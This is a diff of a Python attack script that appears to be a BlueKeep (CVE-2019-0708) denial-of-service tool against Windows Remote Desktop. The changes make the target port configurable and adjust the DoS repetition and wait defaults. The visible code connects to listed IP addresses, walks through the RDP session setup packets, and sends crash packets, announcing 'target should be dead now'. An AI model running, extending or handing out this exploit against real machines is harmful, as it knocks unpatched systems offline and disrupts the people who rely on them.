@@ -1,10 +1,14 @@
+#!/usr/bin/env python
+import sys
 import time
 import socket
 import struct
 import argparse
 import binascii
+import impacket
+
 from OpenSSL import SSL
-from impacket.impacket.structure import Structure
+from impacket.structure import Structure
 
 
 class Parser(argparse.ArgumentParser):
@@ -16,20 +20,24 @@ class Parser(argparse.ArgumentParser):
     def optparse():
         parser = argparse.ArgumentParser()
         parser.add_argument(
-            "-i", "--ip", dest="ipToAttack", metavar="IP[,IP,IP,..]", default=None,
+            "-i", "--ip", dest="ipToAttack", metavar="IP[IP,IP,...]", default=None,
             help="Pass a list of IP addresses separated by a comma or a single IP address (*default=None)"
+        )
+        parser.add_argument(
+            "-p", "--port", type=int, dest="targetPort", metavar="PORT", default=3389,
+            help="Specify the target port number (*default=3389)"
         )
         parser.add_argument(
             "-a", "--arch", type=int, choices=(32, 64), dest="archSelected", metavar="ARCHITECTURE", default=64,
             help="Pass the architecture of the target you are attacking (*default=64)"
         )
         parser.add_argument(
-            "-t", "--dos-times", type=int, dest="dosTime", default=60, metavar="AMOUNT",
-            help="Pass how many times you want to DoS the target before exiting (*default=60)"
+            "-t", "--dos-times", type=int, dest="dosTime", metavar="AMOUNT", default=1,
+            help="Pass how many times you want to DoS the target before exiting (*default=1)"
         )
         parser.add_argument(
-            "-w", "--wait-time", type=int, dest="waitTime", default=70, metavar="SECONDS",
-            help="Pass how long you want to wait in between DoS's (*default=70)"
+            "-w", "--wait-time", type=int, dest="waitTime", metavar="SECONDS", default=0,
+            help="Pass how long you want to wait in between DoS's (*default=0)"
         )
         parser.add_argument(
             "-v", "--verbose", action="store_true", default=False, dest="runVerbose",
@@ -114,7 +122,7 @@ def structify(packet, struct_mode, differences):
     return differs
 
 
-def send_initialization_pdu_packet(host, verbose=False):
+def send_initialization_pdu_packet(host, port=3389, verbose=False):
     """
     initialize the RDP request
     """
@@ -128,7 +136,7 @@ def send_initialization_pdu_packet(host, verbose=False):
     tpkt['TPDU'] = tpdu.getData()
     # start the session
     session = socket.socket()
-    session.connect((host, 3389))
+    session.connect((host, port))
     session.sendall(tpkt.getData())
     results = session.recv(8192)
     if verbose:
@@ -323,14 +331,15 @@ def main():
     main
     """
     opt = Parser().optparse()
+    port = opt.targetPort
     to_attack = []
 
     if opt.ipToAttack is not None:
         for ip in opt.ipToAttack.split(","):
             to_attack.append(ip.strip())
     else:
-        print("usage: python 2019-0708-dos.py -i IP[IP,IP,...] [-a 32|64]")
-        exit(1)
+        print("usage: python bluekeep_dos.py [-i IP[IP,IP,...]] [-p PORT] [-a 32|64]")
+        sys.exit(1)
 
     for target in to_attack:
         try:
@@ -338,7 +347,7 @@ def main():
             for i in range(opt.dosTime):
                 print("[+] DoS attempt: {}".format(i+1))
                 print("[+] establishing initialization")
-                current_tls = send_initialization_pdu_packet(target, verbose=opt.runVerbose)
+                current_tls = send_initialization_pdu_packet(target, port, verbose=opt.runVerbose)
                 print("[+] sending ClientData PDU packets")
                 send_client_data_pdu_packet(current_tls, verbose=opt.runVerbose)
                 print("[+] sending ChannelJoin ErectDomain and AttachUser PDU packets")
@@ -358,9 +367,8 @@ def main():
                 send_establish_session_pdu_packet(current_tls)
                 print("[+] DoSing target: {}".format(target))
                 send_dos_packets(current_tls, opt.archSelected)
-                print("[+] target should be dead now, waiting {}s before starting again".format(opt.waitTime))
+                print("[+] target should be dead now, waiting {}s".format(opt.waitTime))
                 time.sleep(opt.waitTime)
-                print("\n[+] starting again\n")
         except Exception as e:
             print(
                 "[!] error on target: {} ({}), if this happened after a successful attack, change the wait "
@@ -369,4 +377,7 @@ def main():
 
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except (KeyboardInterrupt, SystemExit):
+        pass
